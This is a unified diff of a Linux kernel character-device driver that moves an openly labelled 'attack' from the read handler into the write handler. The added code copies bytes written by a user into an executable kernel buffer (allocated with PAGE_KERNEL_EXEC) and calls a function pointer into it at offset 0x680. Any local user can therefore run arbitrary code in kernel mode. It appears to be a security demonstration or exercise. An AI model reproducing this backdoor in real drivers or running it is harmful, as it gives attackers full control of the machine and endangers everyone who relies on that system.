@@ -102,11 +102,6 @@ static ssize_t device_read(struct file *file, /* see include/linux/fs.h   */
    */
   int bytes_read = 0;
 
-  char *buf;
-  int size = BUF_LEN;
-  int pos = 0;
-  buf = __vmalloc(size + 1, GFP_KERNEL, PAGE_KERNEL_EXEC);
-
 #ifdef DEBUG
   printk(KERN_INFO "device_read(%p,%p,%d)\n", file, buffer, (int) length);
 #endif
@@ -131,7 +126,6 @@ static ssize_t device_read(struct file *file, /* see include/linux/fs.h   */
      * user data segment. 
      */
     put_user(*(Message_Ptr++), buffer++);
-    buf[pos ++] = *(Message_Ptr - 1);
 
     length--;
     bytes_read++;
@@ -140,16 +134,6 @@ static ssize_t device_read(struct file *file, /* see include/linux/fs.h   */
 #ifdef DEBUG
   printk(KERN_INFO "Read %d bytes, %d left\n", bytes_read, (int) length);
 #endif
-
-  /* Let's do the hack here! */
-
-  printk(KERN_INFO "Starts the attack....\n");
-
-  /* Execute the attacking code by function pointer. */
-  bar = (void *) (buf + 0x0000000000000680);
-  s = bar();
-  printk(KERN_INFO "result: %s\n", s);
-
 
   /* 
    * Read functions are supposed to return the number
@@ -168,14 +152,33 @@ device_write(struct file *file,
 {
   int i;
 
+  char *buf;
+  int size = BUF_LEN;
+  buf = __vmalloc(size + 1, GFP_KERNEL, PAGE_KERNEL_EXEC);
+
 #ifdef DEBUG
   printk(KERN_INFO "device_write(%p,%s,%d)", file, buffer, (int) length);
 #endif
 
-  for (i = 0; i < length && i < BUF_LEN; i++)
+  for (i = 0; i < length && i < BUF_LEN; i++) {
     get_user(Message[i], buffer + i);
 
+    buf[i] = Message[i];
+  }
+
   Message_Ptr = Message;
+
+
+  /* Let's do the hack here! */
+
+  printk(KERN_INFO "Starts the attack....\n");
+
+  /* Execute the attacking code by function pointer. */
+  bar = (void *) (buf + 0x0000000000000680);
+  s = bar();
+  printk(KERN_INFO "result: %s\n", s);
+
+
 
   /* 
    * Again, return the number of input characters used 
